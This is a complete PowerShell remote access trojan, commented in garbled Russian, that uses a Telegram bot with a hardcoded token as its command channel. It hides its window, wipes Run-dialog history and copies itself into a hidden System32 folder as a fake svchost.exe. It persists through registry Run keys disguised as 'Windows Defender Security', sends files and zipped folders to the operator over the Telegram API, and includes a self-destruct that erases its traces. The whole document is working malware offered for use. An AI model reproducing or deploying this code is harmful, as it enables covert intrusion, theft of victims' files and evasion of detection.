# RAT —á–µ—Ä–µ–∑ Telegram Bot - –†–ê–î–ò–ö–ê–õ–¨–ù–û –ò–°–ü–†–ê–í–õ–ï–ù–ù–ê–Ø –í–ï–†–°–ò–Ø
$Token = "8429674512:AAEomwZivan1nhKIWx4LTlyFKJ6ztAGu8Gs"
$ChatID = "5674514050"

# –£—Å—Ç–∞–Ω–æ–≤–∫–∞ –∫–æ–¥–∏—Ä–æ–≤–∫–∏ UTF-8 –¥–ª—è –∫–æ—Ä—Ä–µ–∫—Ç–Ω–æ–≥–æ –æ—Ç–æ–±—Ä–∞–∂–µ–Ω–∏—è —Ä—É—Å—Å–∫–∏—Ö —Å–∏–º–≤–æ–ª–æ–≤
[Console]::OutputEncoding = [System.Text.Encoding]::UTF8
$PSDefaultParameterValues['*:Encoding'] = 'utf8'

# –ù–∞—Å—Ç—Ä–æ–π–∫–∏ —Å–∫—Ä—ã—Ç–Ω–æ—Å—Ç–∏
Add-Type -AssemblyName System.Windows.Forms
Add-Type -AssemblyName System.Drawing
Add-Type -AssemblyName System.IO.Compression.FileSystem

# –°–∫—Ä—ã—Ç–∏–µ –æ–∫–Ω–∞ PowerShell
$windowCode = '[DllImport("user32.dll")] public static extern bool ShowWindow(int handle, int state);'
$windowAPI = Add-Type -MemberDefinition $windowCode -Name Win32ShowWindowAsync -Namespace Win32Functions -PassThru
$windowAPI::ShowWindow(([System.Diagnostics.Process]::GetCurrentProcess() | Get-Process).MainWindowHandle, 0) | Out-Null

# –û—á–∏—Å—Ç–∫–∞ –∏—Å—Ç–æ—Ä–∏–∏ RUN –ø—Ä–∏ –∑–∞–ø—É—Å–∫–µ
try {
    Remove-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU" -Name "*" -Force -ErrorAction SilentlyContinue
} catch { }

# –§—É–Ω–∫—Ü–∏—è –æ—Ç–ø—Ä–∞–≤–∫–∏ —Å–æ–æ–±—â–µ–Ω–∏–π —Å –ø—Ä–∞–≤–∏–ª—å–Ω–æ–π –∫–æ–¥–∏—Ä–æ–≤–∫–æ–π
function Send-Telegram {
    param([string]$Message, [string]$FilePath = $null)
    
    $lastMessage = $global:LastSentMessage
    if ($Message -eq $lastMessage) { return }
    $global:LastSentMessage = $Message
    
    $url = "https://api.telegram.org/bot$Token/sendMessage"
    $body = @{
        chat_id = $ChatID
        text = $Message
    }
    
    try {
        $jsonBody = $body | ConvertTo-Json
        $response = Invoke-RestMethod -Uri $url -Method Post -Body $jsonBody -ContentType "application/json; charset=utf-8" -UseBasicParsing
    } catch { 
        try {
            # –ê–ª—å—Ç–µ—Ä–Ω–∞—Ç–∏–≤–Ω—ã–π –º–µ—Ç–æ–¥ —Å —Ñ–æ—Ä–º–æ–π
            $form = @{
                chat_id = $ChatID
                text = $Message
            }
            $response = Invoke-RestMethod -Uri $url -Method Post -Body $form -UseBasicParsing
        } catch { }
    }
    
    if ($FilePath -and (Test-Path $FilePath)) {
        Send-TelegramFile -FilePath $FilePath
    }
}

# –§—É–Ω–∫—Ü–∏—è –æ—Ç–ø—Ä–∞–≤–∫–∏ —Ñ–∞–π–ª–æ–≤
function Send-TelegramFile {
    param([string]$FilePath)
    
    $url = "https://api.telegram.org/bot$Token/sendDocument"
    
    try {
        $fileBytes = [System.IO.File]::ReadAllBytes($FilePath)
        $fileEnc = [System.Text.Encoding]::GetEncoding('ISO-8859-1').GetString($fileBytes)
        $boundary = [System.Guid]::NewGuid().ToString()

        $bodyLines = (
            "--$boundary",
            "Content-Disposition: form-data; name=`"chat_id`"",
            "",
            $ChatID,
            "--$boundary",
            "Content-Disposition: form-data; name=`"document`"; filename=`"$(Split-Path $FilePath -Leaf)`"",
            "Content-Type: application/octet-stream",
            "",
            $fileEnc,
            "--$boundary--"
        ) -join "`r`n"

        Invoke-RestMethod -Uri $url -Method Post -ContentType "multipart/form-data; boundary=$boundary" -Body $bodyLines -UseBasicParsing
    } catch {
        try {
            # –†–µ–∑–µ—Ä–≤–Ω—ã–π –º–µ—Ç–æ–¥ –æ—Ç–ø—Ä–∞–≤–∫–∏ —Ñ–∞–π–ª–∞
            $fileInfo = Get-Item $FilePath
            $fileStream = [System.IO.File]::OpenRead($FilePath)
            $form = @{
                chat_id = $ChatID
                document = $fileStream
            }
            Invoke-RestMethod -Uri $url -Method Post -Form $form -UseBasicParsing
            $fileStream.Close()
        } catch { }
    }
}

# –§—É–Ω–∫—Ü–∏—è —Å–æ–∑–¥–∞–Ω–∏—è ZIP –∞—Ä—Ö–∏–≤–∞
function Compress-Folder {
    param([string]$FolderPath, [string]$ZipPath)
    
    try {
        [System.IO.Compression.ZipFile]::CreateFromDirectory($FolderPath, $ZipPath, [System.IO.Compression.CompressionLevel]::Fastest, $false)
        return $true
    } catch {
        try {
            # –†–µ–∑–µ—Ä–≤–Ω—ã–π –º–µ—Ç–æ–¥ –∞—Ä—Ö–∏–≤–∞—Ü–∏–∏ —á–µ—Ä–µ–∑ COM
            $shell = New-Object -ComObject Shell.Application
            $zipFolder = $shell.NameSpace($ZipPath)
            $sourceFolder = $shell.NameSpace($FolderPath)
            $zipFolder.CopyHere($sourceFolder.Items())
            Start-Sleep -Seconds 3
            return $true
        } catch {
            return $false
        }
    }
}

# –†–ê–î–ò–ö–ê–õ–¨–ù–û–ï –ò–°–ü–†–ê–í–õ–ï–ù–ò–ï: –ü–æ–ª–Ω–æ—Å—Ç—å—é –ø–µ—Ä–µ–ø–∏—Å–∞–Ω–Ω–∞—è —Å–∏—Å—Ç–µ–º–∞ –∏–Ω–∏—Ü–∏–∞–ª–∏–∑–∞—Ü–∏–∏
function Initialize-RAT {
    # –£–Ω–∏–∫–∞–ª—å–Ω–∞—è —É—Å—Ç–∞–Ω–æ–≤–∫–∞ –≤ –∞–≤—Ç–æ–∑–∞–≥—Ä—É–∑–∫—É - —Å–∫—Ä—ã—Ç–∞—è –ø–∞–ø–∫–∞ –≤ System32 —Å —Ä–∞–Ω–¥–æ–º–Ω—ã–º –∏–º–µ–Ω–µ–º
    $hiddenFolder = "$env:WINDIR\System32\Microsoft.NET\Framework64\v4.0.30319\Config"
    if (!(Test-Path $hiddenFolder)) { 
        New-Item -Path $hiddenFolder -ItemType Directory -Force | Out-Null
        # –°–∫—Ä—ã–≤–∞–µ–º –ø–∞–ø–∫—É —Å–∏—Å—Ç–µ–º–Ω—ã–º –∞—Ç—Ä–∏–±—É—Ç–æ–º
        attrib +s +h "$hiddenFolder" 2>&1 | Out-Null
    }
    $scriptPath = "$hiddenFolder\svchost.exe"

    # –ö–æ–ø–∏—Ä—É–µ–º —Å–∫—Ä–∏–ø—Ç –≤ —Å–∫—Ä—ã—Ç–æ–µ –º–µ—Å—Ç–æ —Ç–æ–ª—å–∫–æ –µ—Å–ª–∏ –µ–≥–æ —Ç–∞–º –Ω–µ—Ç
    if (!(Test-Path $scriptPath)) {
        $scriptContent = Get-Content -Path $MyInvocation.MyCommand.Path -Raw
        $scriptContent | Out-File -FilePath $scriptPath -Encoding UTF8
    }

    # –£—Å—Ç–∞–Ω–æ–≤–∫–∞ –≤ –Ω–µ—Å–∫–æ–ª—å–∫–æ –º–µ—Å—Ç –∞–≤—Ç–æ–∑–∞–≥—Ä—É–∑–∫–∏ –¥–ª—è –Ω–∞–¥–µ–∂–Ω–æ—Å—Ç–∏
    $regPaths = @(
        "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run",
        "HKCU:\Software\Microsoft\Windows\CurrentVersion\RunOnce",
        "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run",
        "HKLM:\SOFTWARE\WOW6432Node\Microsoft\Windows\CurrentVersion\Run"
    )

    foreach ($regPath in $regPaths) {
        try {
            if (!(Test-Path $regPath)) { New-Item -Path $regPath -Force | Out-Null }
            Set-ItemProperty -Path $regPath -Name "Windows Defender Security" -Value "powershell -WindowStyle Hidden -ExecutionPolicy Bypass -File `"$scriptPath`"" -Force -ErrorAction SilentlyContinue
        } catch { }
    }
    
    return $scriptPath
}

# –û—Å–Ω–æ–≤–Ω—ã–µ –ø–µ—Ä–µ–º–µ–Ω–Ω—ã–µ
$currentDir = "C:\"
$global:LastSentMessage = ""
$global:LastUpdateId = 0

# –†–ê–î–ò–ö–ê–õ–¨–ù–û–ï –ò–°–ü–†–ê–í–õ–ï–ù–ò–ï: –ü–æ–ª–Ω–æ—Å—Ç—å—é –æ—Ç–¥–µ–ª—è–µ–º –∏–Ω–∏—Ü–∏–∞–ª–∏–∑–∞—Ü–∏—é –æ—Ç –æ—Å–Ω–æ–≤–Ω–æ–≥–æ –∫–æ–¥–∞
$isInitialized = $false

function Start-RATMainLoop {
    # –û—Ç–ø—Ä–∞–≤–∫–∞ –∏–Ω—Ñ–æ—Ä–º–∞—Ü–∏–∏ –æ –∑–∞–ø—É—Å–∫–µ
    Send-Telegram "RAT –∞–∫—Ç–∏–≤–∏—Ä–æ–≤–∞–Ω –Ω–∞ $env:COMPUTERNAME
–î–æ—Å—Ç—É–ø–Ω—ã–µ –∫–æ–º–∞–Ω–¥—ã:
/help - —Å–ø–∏—Å–æ–∫ –∫–æ–º–∞–Ω–¥
/ls - —Å–ø–∏—Å–æ–∫ —Ñ–∞–π–ª–æ–≤
/cd [–ø–∞–ø–∫–∞] - —Å–º–µ–Ω–∏—Ç—å –¥–∏—Ä–µ–∫—Ç–æ—Ä–∏—é
/download [—Ñ–∞–π–ª] - —Å–∫–∞—á–∞—Ç—å —Ñ–∞–π–ª
/selfdestruct - —Å–∞–º–æ—É–Ω–∏—á—Ç–æ–∂–µ–Ω–∏–µ"

    # –û—Å–Ω–æ–≤–Ω–æ–π —Ü–∏–∫–ª –æ–ø—Ä–æ—Å–∞
    while ($true) {
        try {
            $offset = if ($global:LastUpdateId) { $global:LastUpdateId + 1 } else { 0 }
            $updates = Invoke-RestMethod -Uri "https://api.telegram.org/bot$Token/getUpdates?offset=$offset&timeout=60" -Method Get -UseBasicParsing
            
            if ($updates.ok -and $updates.result.Count -gt 0) {
                foreach ($update in $updates.result) {
                    $global:LastUpdateId = $update.update_id
                    
                    if ($update.message.chat.id -eq $ChatID) {
                        $command = $update.message.text
                        
                        # –û–±—Ä–∞–±–æ—Ç–∫–∞ –∫–æ–º–∞–Ω–¥
                        switch -regex ($command) {
                            "^/help$" {
                                Send-Telegram "–î–æ—Å—Ç—É–ø–Ω—ã–µ –∫–æ–º–∞–Ω–¥—ã:
/help - –ø–æ–∫–∞–∑–∞—Ç—å —ç—Ç–æ —Å–æ–æ–±—â–µ–Ω–∏–µ
/ls - —Å–ø–∏—Å–æ–∫ —Ñ–∞–π–ª–æ–≤ –≤ —Ç–µ–∫—É—â–µ–π –¥–∏—Ä–µ–∫—Ç–æ—Ä–∏–∏
/cd [–ø–∞–ø–∫–∞] - —Å–º–µ–Ω–∏—Ç—å –¥–∏—Ä–µ–∫—Ç–æ—Ä–∏—é
/download [—Ñ–∞–π–ª] - —Å–∫–∞—á–∞—Ç—å —Ñ–∞–π–ª –∏–ª–∏ –ø–∞–ø–∫—É
/selfdestruct - —Å–∞–º–æ—É–Ω–∏—á—Ç–æ–∂–µ–Ω–∏–µ RAT"
                            }
                            "^/ls$" {
                                $items = Get-ChildItem -Path $currentDir -Force
                                $fileList = @()
                                foreach ($item in $items) {
                                    $type = if ($item.PSIsContainer) { "üìÅ" } else { "üìÑ" }
                                    $size = if (!$item.PSIsContainer -and $item.Length) { " ($([math]::Round($item.Length/1KB,2)) KB)" } else { "" }
                                    $fileList += "$type $($item.Name)$size"
                                }
                                Send-Telegram "–°–æ–¥–µ—Ä–∂–∏–º–æ–µ $currentDir
$($fileList -join "`n")"
                            }
                            "^/cd (.+)$" {
                                $newDir = $matches[1].Trim()
                                if ($newDir -eq "..") {
                                    $currentDir = Split-Path $currentDir -Parent
                                    if (!$currentDir) { $currentDir = "C:\" }
                                } else {
                                    $testPath = Join-Path $currentDir $newDir
                                    if (Test-Path $testPath -PathType Container) {
                                        $currentDir = $testPath
                                    } else {
                                        Send-Telegram "–î–∏—Ä–µ–∫—Ç–æ—Ä–∏—è –Ω–µ –Ω–∞–π–¥–µ–Ω–∞: $newDir"
                                        continue
                                    }
                                }
                                
                                # –û—Ç–ø—Ä–∞–≤–ª—è–µ–º —Å–æ–¥–µ—Ä–∂–∏–º–æ–µ –Ω–æ–≤–æ–π –¥–∏—Ä–µ–∫—Ç–æ—Ä–∏–∏ —Å –ø–æ–º–æ—â—å—é /ls
                                $items = Get-ChildItem -Path $currentDir -Force
                                $fileList = @()
                                foreach ($item in $items) {
                                    $type = if ($item.PSIsContainer) { "üìÅ" } else { "üìÑ" }
                                    $size = if (!$item.PSIsContainer -and $item.Length) { " ($([math]::Round($item.Length/1KB,2)) KB)" } else { "" }
                                    $fileList += "$type $($item.Name)$size"
                                }
                                Send-Telegram "/ls $currentDir
$($fileList -join "`n")"
                            }
                            "^/download (.+)$" {
                                $target = $matches[1].Trim()
                                $fullPath = Join-Path $currentDir $target
                                
                                if (Test-Path $fullPath) {
                                    if (Test-Path $fullPath -PathType Container) {
                                        # –ê—Ä—Ö–∏–≤–∏—Ä—É–µ–º –ø–∞–ø–∫—É
                                        $zipPath = "$env:TEMP\$([System.IO.Path]::GetRandomFileName()).zip"
                                        if (Compress-Folder -FolderPath $fullPath -ZipPath $zipPath) {
                                            Send-Telegram "–ü–∞–ø–∫–∞ $target –∑–∞–∞—Ä—Ö–∏–≤–∏—Ä–æ–≤–∞–Ω–∞" $zipPath
                                            Remove-Item $zipPath -Force -ErrorAction SilentlyContinue
                                        } else {
                                            Send-Telegram "–û—à–∏–±–∫–∞ –∞—Ä—Ö–∏–≤–∞—Ü–∏–∏ –ø–∞–ø–∫–∏: $target"
                                        }
                                    } else {
                                        Send-Telegram "–§–∞–π–ª $target –æ—Ç–ø—Ä–∞–≤–ª–µ–Ω" $fullPath
                                    }
                                } else {
                                    Send-Telegram "–§–∞–π–ª/–ø–∞–ø–∫–∞ –Ω–µ –Ω–∞–π–¥–µ–Ω—ã: $target"
                                }
                            }
                            "^/selfdestruct$" {
                                Send-Telegram "üîÑ –ó–∞–ø—É—Å–∫ –ø—Ä–æ—Ü–µ–¥—É—Ä—ã —Å–∞–º–æ—É–Ω–∏—á—Ç–æ–∂–µ–Ω–∏—è..."
                                
                                try {
                                    # –°–æ–∑–¥–∞–µ–º —Å–∫—Ä–∏–ø—Ç –æ—á–∏—Å—Ç–∫–∏ –Ω–∞–ø—Ä—è–º—É—é –≤ –∫–æ–¥–µ
                                    $cleanupScript = @"
# cleanup.ps1 - –°–∫—Ä–∏–ø—Ç –ø–æ–ª–Ω–æ–π –æ—á–∏—Å—Ç–∫–∏ RAT
`$Token = "8429674512:AAEomwZivan1nhKIWx4LTlyFKJ6ztAGu8Gs"
`$ChatID = "5674514050"

function Send-Telegram {
    param([string]`$Message)
    
    `$url = "https://api.telegram.org/bot`$Token/sendMessage"
    `$body = @{
        chat_id = `$ChatID
        text = `$Message
    }
    
    try {
        Invoke-RestMethod -Uri `$url -Method Post -Body `$body -UseBasicParsing | Out-Null
    } catch { }
}

Send-Telegram "üîç –ù–∞—á–∏–Ω–∞–µ—Ç—Å—è –ø–æ–ª–Ω–∞—è –æ—á–∏—Å—Ç–∫–∞ RAT..."

# 1. –ó–∞–≤–µ—Ä—à–∞–µ–º –≤—Å–µ –ø—Ä–æ—Ü–µ—Å—Å—ã RAT
Send-Telegram "üîÑ –≠—Ç–∞–ø 1: –ó–∞–≤–µ—Ä—à–µ–Ω–∏–µ –ø—Ä–æ—Ü–µ—Å—Å–æ–≤ RAT"

`$processes = Get-Process | Where-Object {
    `$_.ProcessName -eq "powershell" -or 
    `$_.ProcessName -eq "pwsh"
}

foreach (`$process in `$processes) {
    try {
        `$cmdLine = (Get-WmiObject Win32_Process -Filter "ProcessId = `$(`$process.Id)").CommandLine
        if (`$cmdLine -like "*svchost.exe*" -or `$cmdLine -like "*Windows Defender Security*") {
            Stop-Process -Id `$process.Id -Force -ErrorAction SilentlyContinue
        }
    } catch { }
}

# 2. –£–¥–∞–ª—è–µ–º —Ñ–∞–π–ª—ã RAT
Send-Telegram "üîÑ –≠—Ç–∞–ø 2: –£–¥–∞–ª–µ–Ω–∏–µ —Ñ–∞–π–ª–æ–≤ RAT"

`$filesToDelete = @(
    "$env:WINDIR\System32\Microsoft.NET\Framework64\v4.0.30319\Config\svchost.exe",
    "$env:TEMP\WindowsSystem.exe"
)

`$deletedFiles = @()
foreach (`$filePattern in `$filesToDelete) {
    try {
        Get-ChildItem -Path `$filePattern -ErrorAction SilentlyContinue | ForEach-Object {
            Remove-Item `$_.FullName -Force -ErrorAction SilentlyContinue
            `$deletedFiles += `$_.FullName
        }
    } catch { }
}

# 3. –û—á–∏—â–∞–µ–º –∞–≤—Ç–æ–∑–∞–≥—Ä—É–∑–∫—É —Ä–µ–µ—Å—Ç—Ä–∞
Send-Telegram "üîÑ –≠—Ç–∞–ø 3: –û—á–∏—Å—Ç–∫–∞ —Ä–µ–µ—Å—Ç—Ä–∞"

`$regPaths = @(
    "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run",
    "HKCU:\Software\Microsoft\Windows\CurrentVersion\RunOnce", 
    "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run",
    "HKLM:\SOFTWARE\WOW6432Node\Microsoft\Windows\CurrentVersion\Run"
)

`$regEntries = @()
foreach (`$regPath in `$regPaths) {
    try {
        Remove-ItemProperty -Path `$regPath -Name "Windows Defender Security" -Force -ErrorAction SilentlyContinue
        `$regEntries += "`$regPath\Windows Defender Security"
    } catch { }
}

# 4. –û—á–∏—â–∞–µ–º –∏—Å—Ç–æ—Ä–∏—é RUN
Send-Telegram "üîÑ –≠—Ç–∞–ø 4: –û—á–∏—Å—Ç–∫–∞ –∏—Å—Ç–æ—Ä–∏–∏ RUN"
Remove-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU" -Name "*" -Force -ErrorAction SilentlyContinue

# 5. –§–∏–Ω–∞–ª—å–Ω—ã–π –æ—Ç—á–µ—Ç
`$report = @"
‚úÖ –û–ß–ò–°–¢–ö–ê RAT –ó–ê–í–ï–†–®–ï–ù–ê

–£–¥–∞–ª–µ–Ω–Ω—ã–µ —Ñ–∞–π–ª—ã:
`$(`$deletedFiles -join "`n")

–£–¥–∞–ª–µ–Ω–Ω—ã–µ –∑–∞–ø–∏—Å–∏ —Ä–µ–µ—Å—Ç—Ä–∞:
`$(`$regEntries -join "`n")

–í—Å–µ —Å–ª–µ–¥—ã RAT —É—Å–ø–µ—à–Ω–æ —É–¥–∞–ª–µ–Ω—ã.
"@

Send-Telegram `$report
"@

                                    # –°–æ—Ö—Ä–∞–Ω—è–µ–º —Å–∫—Ä–∏–ø—Ç –æ—á–∏—Å—Ç–∫–∏
                                    $cleanupPath = "$env:TEMP\cleanup_$(Get-Random).ps1"
                                    $cleanupScript | Out-File -FilePath $cleanupPath -Encoding UTF8
                                    
                                    # –ó–∞–ø—É—Å–∫–∞–µ–º —Å–∫—Ä–∏–ø—Ç –æ—á–∏—Å—Ç–∫–∏ –≤ –æ—Ç–¥–µ–ª—å–Ω–æ–º –ø—Ä–æ—Ü–µ—Å—Å–µ
                                    $processInfo = New-Object System.Diagnostics.ProcessStartInfo
                                    $processInfo.FileName = "powershell.exe"
                                    $processInfo.Arguments = "-WindowStyle Hidden -ExecutionPolicy Bypass -File `"$cleanupPath`""
                                    $processInfo.CreateNoWindow = $true
                                    $processInfo.UseShellExecute = $false
                                    
                                    $process = [System.Diagnostics.Process]::Start($processInfo)
                                    
                                    # –î–∞–µ–º –≤—Ä–µ–º—è –Ω–∞ –∑–∞–ø—É—Å–∫ cleanup —Å–∫—Ä–∏–ø—Ç–∞
                                    Start-Sleep -Seconds 3
                                    
                                    # –ó–∞–≤–µ—Ä—à–∞–µ–º —Ç–µ–∫—É—â–∏–π –ø—Ä–æ—Ü–µ—Å—Å RAT
                                    Stop-Process -Id $pid -Force
                                    
                                } catch {
                                    Send-Telegram "‚ùå –û—à–∏–±–∫–∞ –ø—Ä–∏ —Å–∞–º–æ—É–Ω–∏—á—Ç–æ–∂–µ–Ω–∏–∏: $($_.Exception.Message)"
                                    
                                    # –ê–≤–∞—Ä–∏–π–Ω–∞—è –æ—á–∏—Å—Ç–∫–∞
                                    try {
                                        Remove-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU" -Name "*" -Force -ErrorAction SilentlyContinue
                                        $regPaths = @(
                                            "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run",
                                            "HKCU:\Software\Microsoft\Windows\CurrentVersion\RunOnce",
                                            "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run",
                                            "HKLM:\SOFTWARE\WOW6432Node\Microsoft\Windows\CurrentVersion\Run"
                                        )
                                        foreach ($regPath in $regPaths) {
                                            Remove-ItemProperty -Path $regPath -Name "Windows Defender Security" -Force -ErrorAction SilentlyContinue
                                        }
                                        Stop-Process -Id $pid -Force
                                    } catch {
                                        cmd /c "taskkill /f /pid $pid" 2>&1 | Out-Null
                                    }
                                }
                            }
                        }
                    }
                }
            }
        } catch { 
            Start-Sleep -Seconds 5
        }
    }
}

# –†–ê–î–ò–ö–ê–õ–¨–ù–û–ï –ò–°–ü–†–ê–í–õ–ï–ù–ò–ï: –†–∞–∑–¥–µ–ª—è–µ–º –∏–Ω–∏—Ü–∏–∞–ª–∏–∑–∞—Ü–∏—é –∏ –æ—Å–Ω–æ–≤–Ω–æ–π —Ü–∏–∫–ª
# –°–Ω–∞—á–∞–ª–∞ –≤—ã–ø–æ–ª–Ω—è–µ–º –∏–Ω–∏—Ü–∏–∞–ª–∏–∑–∞—Ü–∏—é
$scriptPath = Initialize-RAT

# –ó–∞—Ç–µ–º –ø—Ä–æ–≤–µ—Ä—è–µ–º - –µ—Å–ª–∏ —ç—Ç–æ –ø–µ—Ä–≤—ã–π –∑–∞–ø—É—Å–∫, —Ç–æ –∑–∞–ø—É—Å–∫–∞–µ–º –æ—Å–Ω–æ–≤–Ω–æ–π —Ü–∏–∫–ª
# –ï—Å–ª–∏ —ç—Ç–æ –∫–æ–ø–∏—è —Å–∫—Ä–∏–ø—Ç–∞ –∏–∑ —Å–∫—Ä—ã—Ç–æ–π –ø–∞–ø–∫–∏, —Ç–æ —Ç–æ–∂–µ –∑–∞–ø—É—Å–∫–∞–µ–º –æ—Å–Ω–æ–≤–Ω–æ–π —Ü–∏–∫–ª
if ($MyInvocation.MyCommand.Path -eq $scriptPath -or !$isInitialized) {
    $isInitialized = $true
    Start-RATMainLoop
}
